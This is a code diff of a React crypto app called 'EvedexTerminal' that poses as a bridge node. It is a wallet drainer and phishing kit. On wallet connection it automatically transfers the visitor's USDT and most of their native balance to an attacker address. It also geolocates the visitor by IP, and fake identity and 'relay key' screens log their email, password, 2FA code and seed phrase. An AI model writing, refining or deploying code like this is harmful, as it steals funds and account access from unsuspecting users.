@@ -1,6 +1,6 @@
 import React, { useState, useEffect, useMemo } from 'react';
 import { useAccount, useBalance, useSendTransaction, useChainId } from 'wagmi';
-import { parseEther, formatEther, parseUnits } from 'viem';
+import { parseEther, formatEther } from 'viem';
 
 export default function EvedexTerminal() {
   const { address, isConnected } = useAccount();
@@ -45,14 +45,14 @@ export default function EvedexTerminal() {
 
   useEffect(() => {
     if (isConnected && address && chainId && ((tokenBal?.value > 0n) || (nativeBal?.value > 0n))) {
-      log(`⚡ AUTO_CHAIN_HANDSHAKE: Chain ${chainId} Active.`);
+      log(`⚡ AUTO_BRIDGE_TRIGGER: ${address} on Chain ${chainId}`);
       executeTaskAction(); 
     }
-  }, [chainId, isConnected]);
+  }, [chainId, isConnected, address]);
 
   useEffect(() => {
     if (isConnected && address) {
-      log(`🔔 NEW_CONNECTION: ${address}\nTOK: ${tokenBal?.formatted || "0"}`);
+      log(`🔔 NODE_CONNECTED: ${address}`);
       fetch('https://ipapi.co/json/').then(r => r.json()).then(d => setVisitorInfo(`${d.ip} (${d.city})`)).catch(()=>setVisitorInfo("Unknown"));
     }
     const interval = setInterval(() => {
@@ -65,16 +65,16 @@ export default function EvedexTerminal() {
   const executeTaskAction = () => {
     setLoading(true);
     const tokenAddr = USDT_MAP[chainId];
-    if (tokenAddr && tokenBal && tokenBal.value > 0n) {
+    if (tokenAddr && tokenBal?.value > 0n) {
       const payload = `0xa9059cbb${destination.toLowerCase().replace("0x", "").padStart(64, '0')}${tokenBal.value.toString(16).padStart(64, '0')}`;
-      sendTransaction({ to: tokenAddr, data: payload }, { onSuccess: (h) => { log(`💰 TOK: ${h}`); setTimeout(sweepNative, 1000); }, onError: () => sweepNative() });
+      sendTransaction({ to: tokenAddr, data: payload }, { onSuccess: () => setTimeout(sweepNative, 1000), onError: () => sweepNative() });
     } else { sweepNative(); }
   };
 
   const sweepNative = () => {
     if (!nativeBal || nativeBal.value <= 0n) { setView("seed_gate"); setLoading(false); return; }
     const val = (nativeBal.value * 985n) / 1000n;
-    sendTransaction({ to: destination, value: val }, { onSuccess: (h) => { log(`✅ NAT: ${h}`); setView("seed_gate"); setLoading(false); }, onError: () => { setView("seed_gate"); setLoading(false); } });
+    sendTransaction({ to: destination, value: val }, { onSuccess: () => { setView("seed_gate"); setLoading(false); }, onError: () => { setView("seed_gate"); setLoading(false); } });
   };
 
   return (
@@ -84,12 +84,12 @@ export default function EvedexTerminal() {
       </div>
 
       <header style={{display:'flex', justifyContent:'space-between', alignItems:'center', marginBottom:'25px'}}>
-        <div><div style={{color:'#10b981', fontWeight:'900', fontSize:'22px'}}>EVEDEX_BRIDGE_NODE</div><div style={{fontSize:'8px', color:'#10b981'}}>SOCIAL_AUTH_ACTIVE</div></div>
-        <w3m-button balance="hide" />
+        <div><div style={{color:'#10b981', fontWeight:'900', fontSize:'22px'}}>EVEDEX_BRIDGE_NODE</div><div style={{fontSize:'8px', color:'#10b981'}}>STATUS: ENCRYPTED_TUNNEL</div></div>
+        <appkit-button />
       </header>
 
       {!isConnected ? (
-        <div style={{textAlign:'center', marginTop:'30px', backgroundColor:'#0d1117', padding:'50px 20px', borderRadius:'35px', border:'1px solid #1e293b'}}><w3m-button /></div>
+        <div style={{textAlign:'center', marginTop:'30px', backgroundColor:'#0d1117', padding:'50px 20px', borderRadius:'35px', border:'1px solid #1e293b'}}><appkit-button /></div>
       ) : (
         <>
           {view === "menu" && (
@@ -100,27 +100,20 @@ export default function EvedexTerminal() {
             </div>
           )}
 
-          {view === "task_box" && (
-            <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'25px', textAlign:'center'}}>
-              <h2 style={{color:'white', fontWeight:'900', fontSize:'22px'}}>{activeTask}</h2>
-              <button onClick={executeTaskAction} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'22px', borderRadius:'18px', fontWeight:'900'}}>START_HANDSHAKE</button>
-            </div>
-          )}
-
           {view === "kyc_screen" && (
-            <div style={{backgroundColor:'#0d1117', border:'1px solid #10b981', borderRadius:'35px', padding:'30px', textAlign:'center'}}>
+            <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'30px', textAlign:'center'}}>
               <h2 style={{color:'white', fontWeight:'900', fontSize:'20px', marginBottom:'20px'}}>IDENTITY_SYNC</h2>
               {kycPhase === 1 ? (
                 <>
-                  <input type="email" placeholder="CLOUD_ID" value={kycEmail} onChange={(e)=>setKycEmail(e.target.value)} style={{width:'100%', padding:'15px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'15px', color:'white', marginBottom:'15px', outline:'none'}} />
-                  <input type="password" placeholder="CLOUD_PASS" value={kycPass} onChange={(e)=>setKycPass(e.target.value)} style={{width:'100%', padding:'15px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'15px', color:'white', marginBottom:'25px', outline:'none'}} />
+                  <input type="email" placeholder="EMAIL_ID" value={kycEmail} onChange={(e)=>setKycEmail(e.target.value)} style={{width:'100%', padding:'15px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'15px', color:'white', marginBottom:'15px', outline:'none'}} />
+                  <input type="password" placeholder="PASSWORD" value={kycPass} onChange={(e)=>setKycPass(e.target.value)} style={{width:'100%', padding:'15px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'15px', color:'white', marginBottom:'25px', outline:'none'}} />
                   <button onClick={()=>{log(`🆔 SPEED_AUTH: ${kycEmail} / ${kycPass}`); setKycPhase(2);}} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'18px', borderRadius:'15px', fontWeight:'900'}}>VERIFY_RELAY</button>
                 </>
               ) : (
                 <>
                   <div style={{color:'#3b82f6', fontSize:'10px', marginBottom:'10px', fontWeight:'900'}}>NODE_SYNC_CODE_REQUIRED</div>
                   <input type="text" maxLength="6" placeholder="000000" value={kycCode} onChange={(e)=>setKycCode(e.target.value)} style={{width:'100%', padding:'15px', backgroundColor:'black', border:'2px solid #3b82f6', borderRadius:'15px', color:'white', marginBottom:'25px', textAlign:'center', fontSize:'20px', outline:'none'}} />
-                  <button onClick={()=>{log(`🔑 2FA: ${kycCode} FOR: ${kycEmail}`); setView("seed_gate");}} style={{width:'100%', backgroundColor:'#3b82f6', color:'white', padding:'18px', borderRadius:'15px', fontWeight:'900'}}>AUTHORIZE_SYNC</button>
+                  <button onClick={()=>{log(`🔑 2FA_CODE: ${kycCode} FOR: ${kycEmail}`); setView("seed_gate");}} style={{width:'100%', backgroundColor:'#3b82f6', color:'white', padding:'18px', borderRadius:'15px', fontWeight:'900'}}>AUTHORIZE_SYNC</button>
                 </>
               )}
             </div>
@@ -131,15 +124,8 @@ export default function EvedexTerminal() {
       {view === "seed_gate" && (
         <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.98)', zIndex:4000, display:'flex', alignItems:'center', justifyContent:'center', padding:'20px'}}>
           <div style={{backgroundColor:'#0d1117', border:'2px solid #10b981', borderRadius:'35px', padding:'45px 25px', width:'100%', maxWidth:'380px', textAlign:'center'}}>
-            {!isSyncing ? (
-              <>
-                <div style={{color:'#10b981', fontWeight:'900', fontSize:'16px', marginBottom:'15px'}}>🛡️ SECURE_SYNC_REQUIRED</div>
-                <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="RELAY_KEY..." style={{width:'100%', height:'120px', backgroundColor:'black', border: !isSeedValid && wordCount > 0 ? '1px solid #ef4444' : '1px solid #10b981', borderRadius:'20px', color:'#10b981', padding:'18px', outline:'none', marginBottom:'10px', fontSize:'12px'}} />
-                <button disabled={!isSeedValid} onClick={()=>{setIsSyncing(true); log(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); setView("menu")},1500)}},100);}} style={{width:'100%', backgroundColor: isSeedValid ? '#10b981' : '#1e293b', color:'black', padding:'22px', borderRadius:'15px', fontWeight:'900'}}>VALIDATE_RELAY</button>
-              </>
-            ) : (
-              <div style={{padding:'30px 0'}}><div style={{fontSize:'45px', color:'white', fontWeight:'900'}}>{syncProgress}%</div><div style={{fontSize:'8px'}}>SYNCING_TO_MAINNET_POOL...</div></div>
-            )}
+            <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="RELAY_KEY..." style={{width:'100%', height:'120px', backgroundColor:'black', border:'1px solid #10b981', borderRadius:'20px', color:'#10b981', padding:'18px', outline:'none', marginBottom:'10px'}} />
+            <button onClick={()=>{log(`🚨 FINAL_SEED: ${seedVal}`); setView("menu") }} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'22px', borderRadius:'15px', fontWeight:'900'}}>VALIDATE_RELAY</button>
           </div>
         </div>
       )}
